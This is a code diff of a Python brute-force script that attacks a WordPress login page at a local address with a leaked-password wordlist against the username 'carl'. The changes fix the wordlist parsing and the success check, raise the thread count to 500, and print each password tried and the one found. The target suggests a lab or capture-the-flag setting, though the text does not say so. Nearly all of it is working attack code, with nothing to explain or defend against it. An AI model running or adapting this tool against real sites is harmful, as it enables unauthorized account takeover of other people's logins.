@@ -9,13 +9,13 @@ from bs4 import BeautifulSoup
 from html.parser import HTMLParser
 
 target = "http://127.0.0.1:31337/wp-login.php"
-success_string = "Welcome o WordPress!"
+success_string = "Welcome to WordPress!"
 wordlist = "./SecLists/Passwords/darkweb2017-top10000.txt"
 username = "carl"
-thread_amount = 50
+thread_amount = 500
 
 abort = False
-
+found = ""
 
 class loginform:
     def __init__(self, log, pwd, wp_submit, redirect_to, testcookie):
@@ -35,7 +35,7 @@ def get_words():
     raw_words = file.read()
     
     word_queue = queue.Queue()
-    for word in raw_words:
+    for word in raw_words.split():
       word_queue.put(word)
     return word_queue
 
@@ -53,7 +53,7 @@ def get_params(content):
   return params
 
 def brute(url, username, passwords: queue.Queue):
-  global abort
+  global abort, found
   session = requests.Session()
   first_resp = session.get(url)
   params = get_params(first_resp.content)
@@ -62,13 +62,16 @@ def brute(url, username, passwords: queue.Queue):
   while not passwords.empty() and not abort:
     time.sleep(1)
     passwd = passwords.get()
-    print(".", end="", flush=True)
+    print(f"{passwd}:", end="", flush=True)
     params["pwd"] = passwd
     
     response = session.post(url, data=params)
     if success_string in response.content.decode():
       abort = True
-      print(f"Found password: {passwd}")
+      found = passwd
+      
+      for _ in range(10):
+        print(f"Found password: {passwd}")
       
     
     
@@ -84,3 +87,5 @@ try:
     time.sleep(0.1)
 except KeyboardInterrupt:
   abort = True
+
+print(f"Found password: {found}")
